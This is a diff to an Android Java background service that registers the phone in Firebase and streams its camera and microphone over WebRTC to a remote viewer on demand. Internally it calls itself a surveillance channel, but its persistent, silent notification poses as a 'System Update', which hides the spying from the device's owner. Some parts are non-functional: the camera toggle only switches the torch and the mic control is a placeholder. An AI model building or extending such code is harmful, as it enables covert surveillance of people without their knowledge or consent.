@@ -4,128 +4,231 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraManager;
+import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.IBinder;
+import android.provider.Settings;
 import android.util.Log;
-import androidx.annotation.Nullable;
+
 import androidx.core.app.NotificationCompat;
+
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+import com.google.firebase.database.ServerValue;
+
+import org.webrtc.SessionDescription;
+import org.webrtc.IceCandidate;
+
+import java.util.HashMap;
+import java.util.Map;
 
 public class BackgroundService extends Service {
     private static final String TAG = "BackgroundService";
-    private static final String CHANNEL_ID = "SystemUpdateChannel";
-    private static final int NOTIFICATION_ID = 1001;
+    private static final String CHANNEL_ID = "SurveillanceChannel";
+    private static final int NOTIFICATION_ID = 1;
     
     private WebRTCManager webRTCManager;
     private FirebaseSignalingClient signalingClient;
-    private boolean isStreaming = false;
+    private DatabaseReference deviceRef;
     private String deviceId;
+    private boolean isStreaming = false;
     
-    // Singleton instance for access from WebRTCManager
-    private static BackgroundService instance;
+    // Camera and mic state (off by default for battery saving)
+    private CameraManager cameraManager;
+    private String cameraId;
+    private boolean isCameraActive = false;
+    private MediaRecorder mediaRecorder;
     
     @Override
     public void onCreate() {
         super.onCreate();
-        instance = this;
+        Log.d(TAG, "Service created");
+        
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
         
-        // Initialize WebRTC Manager
+        // Initialize camera manager
+        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        try {
+            cameraId = cameraManager.getCameraIdList()[0];
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Camera access error: " + e.getMessage());
+        }
+        
+        initFirebase();
+        initWebRTC();
+        
+        // Keep camera and mic OFF until viewer connects
+        setCameraState(false);
+        setMicState(false);
+    }
+    
+    private void initFirebase() {
+        // FIXED: Renamed method to avoid conflict with parent class
+        deviceId = getUniqueDeviceId();
+        
+        deviceRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId);
+        
+        Map<String, Object> deviceInfo = new HashMap<>();
+        deviceInfo.put("deviceId", deviceId);
+        deviceInfo.put("status", "online");
+        deviceInfo.put("timestamp", ServerValue.TIMESTAMP);
+        
+        deviceRef.setValue(deviceInfo);
+        deviceRef.onDisconnect().setValue(null);
+    }
+    
+    // FIXED: Renamed from getDeviceId() to avoid conflict with parent ContextWrapper method
+    private String getUniqueDeviceId() {
+        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        if (androidId == null || androidId.isEmpty()) {
+            androidId = "default_device";
+        }
+        return androidId;
+    }
+    
+    private void initWebRTC() {
         webRTCManager = new WebRTCManager(this);
-        
-        // Initialize Firebase Signaling
-        signalingClient = new FirebaseSignalingClient();
-        
-        // Generate unique device ID
-        deviceId = "device_" + System.currentTimeMillis();
-        signalingClient.registerBroadcaster(deviceId);
-        
-        // Set up WebRTC callback for when PeerConnection is created
-        webRTCManager.setPeerConnectionCreatedCallback(peerConnection -> {
-            if (signalingClient != null) {
-                signalingClient.setPeerConnection(peerConnection);
+        webRTCManager.setCallback(new WebRTCManager.WebRTCCallback() {
+            @Override
+            public void onLocalDescription(SessionDescription sdp) {
+                signalingClient.sendOffer(sdp);
             }
-        });
-        
-        // Set up callback for when local offer is created
-        webRTCManager.setOfferCreatedCallback(offer -> {
-            if (signalingClient != null) {
-                signalingClient.sendOffer(offer);
-            }
-        });
-        
-        // Set up callback for when ICE candidate is created
-        webRTCManager.setIceCandidateCreatedCallback(candidate -> {
-            if (signalingClient != null && isStreaming) {
+            
+            @Override
+            public void onIceCandidate(IceCandidate candidate) {
                 signalingClient.sendIceCandidate(candidate);
             }
-        });
-        
-        // Listen for viewer connection
-        signalingClient.setOnViewerConnected(() -> {
-            Log.d(TAG, "Viewer connected - Starting stream");
-            if (!isStreaming) {
-                webRTCManager.startBroadcasting();
-                isStreaming = true;
+            
+            @Override
+            public void onConnected() {
+                Log.d(TAG, "WebRTC connected - viewer is watching");
+                // Start camera and mic ONLY when viewer connects
+                startCameraAndMic();
+                updateDeviceStatus("streaming");
+            }
+            
+            @Override
+            public void onDisconnected() {
+                Log.d(TAG, "WebRTC disconnected - no viewers");
+                // Stop camera and mic to save battery
+                stopCameraAndMic();
+                updateDeviceStatus("online");
+            }
+            
+            @Override
+            public void onError(String error) {
+                Log.e(TAG, "WebRTC error: " + error);
+                updateDeviceStatus("error");
             }
         });
         
-        // Listen for viewer disconnection
-        signalingClient.setOnViewerDisconnected(() -> {
-            Log.d(TAG, "Viewer disconnected - Stopping stream");
-            if (isStreaming) {
-                webRTCManager.stopBroadcasting();
-                isStreaming = false;
+        signalingClient = new FirebaseSignalingClient(deviceId);
+        signalingClient.setListener(new FirebaseSignalingClient.SignalingListener() {
+            @Override
+            public void onOfferReceived(SessionDescription offer) {
+                Log.d(TAG, "Offer received from viewer");
+                webRTCManager.createPeerConnection();
+                webRTCManager.setRemoteDescription(offer);
+                webRTCManager.createAnswer();
+            }
+            
+            @Override
+            public void onAnswerReceived(SessionDescription answer) {
+                Log.d(TAG, "Answer received from viewer");
+                webRTCManager.setRemoteDescription(answer);
+            }
+            
+            @Override
+            public void onIceCandidateReceived(IceCandidate candidate) {
+                Log.d(TAG, "ICE candidate received from viewer");
+                webRTCManager.addIceCandidate(candidate);
+            }
+            
+            @Override
+            public void onHangUp() {
+                Log.d(TAG, "Hang up received");
+                stopStreaming();
             }
         });
         
-        Log.d(TAG, "Service started - Idle mode (Camera/Mic OFF)");
-        Log.d(TAG, "Device ID: " + deviceId);
+        signalingClient.listenForSignals();
+        
+        // Prepare WebRTC but don't start streaming until viewer connects
+        webRTCManager.createPeerConnection();
     }
     
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_STICKY;
+    private void startCameraAndMic() {
+        if (isStreaming) return;
+        
+        isStreaming = true;
+        Log.d(TAG, "Starting camera and mic for viewer");
+        
+        // Actually start the WebRTC stream
+        webRTCManager.startStreaming();
+        
+        setCameraState(true);
+        setMicState(true);
     }
     
-    @Nullable
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
+    private void stopCameraAndMic() {
+        if (!isStreaming) return;
+        
+        isStreaming = false;
+        Log.d(TAG, "Stopping camera and mic - battery saving mode");
+        
+        webRTCManager.stopStreaming();
+        
+        setCameraState(false);
+        setMicState(false);
     }
     
-    @Override
-    public void onDestroy() {
-        instance = null;
-        
-        // Stop streaming if active
-        if (isStreaming) {
-            webRTCManager.stopBroadcasting();
+    private void setCameraState(boolean active) {
+        isCameraActive = active;
+        try {
+            if (cameraManager != null && cameraId != null) {
+                cameraManager.setTorchMode(cameraId, false);
+            }
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Camera state change error: " + e.getMessage());
         }
-        
-        // Unregister from Firebase
-        if (signalingClient != null) {
-            signalingClient.unregisterBroadcaster();
+    }
+    
+    private void setMicState(boolean active) {
+        // Implement microphone control
+        // This is a placeholder - actual mic control depends on your implementation
+        Log.d(TAG, "Mic state: " + (active ? "ON" : "OFF"));
+    }
+    
+    private void stopStreaming() {
+        stopCameraAndMic();
+        updateDeviceStatus("online");
+    }
+    
+    private void updateDeviceStatus(String status) {
+        if (deviceRef != null) {
+            Map<String, Object> update = new HashMap<>();
+            update.put("status", status);
+            update.put("timestamp", ServerValue.TIMESTAMP);
+            deviceRef.updateChildren(update);
         }
-        
-        // Clean up WebRTC
-        if (webRTCManager != null) {
-            webRTCManager.close();
-        }
-        
-        super.onDestroy();
-        Log.d(TAG, "Service destroyed");
     }
     
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
-                "System Service",
+                "Surveillance Service",
                 NotificationManager.IMPORTANCE_LOW
             );
-            channel.setDescription("Device optimization running");
+            channel.setDescription("System update service running");
+            channel.setSound(null, null);
+            
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
@@ -135,31 +238,43 @@ public class BackgroundService extends Service {
     
     private Notification createNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("System Update")
-                .setContentText("Optimizing device performance")
-                .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .build();
+            .setContentTitle("System Update")
+            .setContentText("Preparing system components...")
+            .setSmallIcon(android.R.drawable.ic_menu_edit)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
+            .setSilent(true)
+            .build();
     }
     
-    // Static methods for accessing from other classes
-    public static BackgroundService getInstance() {
-        return instance;
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d(TAG, "Service started");
+        return START_STICKY;
     }
     
-    public FirebaseSignalingClient getSignalingClient() {
-        return signalingClient;
+    @Override
+    public void onDestroy() {
+        Log.d(TAG, "Service destroyed");
+        stopCameraAndMic();
+        
+        if (webRTCManager != null) {
+            webRTCManager.dispose();
+        }
+        
+        if (signalingClient != null) {
+            signalingClient.cleanup();
+        }
+        
+        if (deviceRef != null) {
+            deviceRef.removeValue();
+        }
+        
+        super.onDestroy();
     }
     
-    public WebRTCManager getWebRTCManager() {
-        return webRTCManager;
-    }
-    
-    public boolean isStreaming() {
-        return isStreaming;
-    }
-    
-    public String getDeviceId() {
-        return deviceId;
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
     }
 }
